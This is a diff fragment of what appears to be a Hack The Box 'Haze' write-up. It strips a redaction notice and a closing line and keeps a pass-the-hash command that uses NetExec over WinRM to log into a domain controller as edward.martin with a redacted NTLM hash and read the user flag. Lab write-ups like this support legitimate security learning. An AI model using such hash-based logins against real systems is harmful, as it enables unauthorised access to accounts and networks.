@@ -1,6 +1,3 @@
-> **Publication note:** Passwords, hashes, flags, and Splunk secrets are redacted. HTB IP may differ per spawn.
-
-
 Target : 10.129.232.50
 
 Date : 30/06/2026
@@ -809,8 +806,3 @@ nxc winrm dc01.haze.htb -u edward.martin -H <EDWARD_NTLM_HASH> -d haze.htb \
   -X 'type C:\Users\edward.martin\Desktop\user.txt' --no-progress
 # user: <REDACTED_USER_FLAG>
 ```
-
-
----
-
-*Haze [HARD] — sealed. Secrets redacted for publication.*
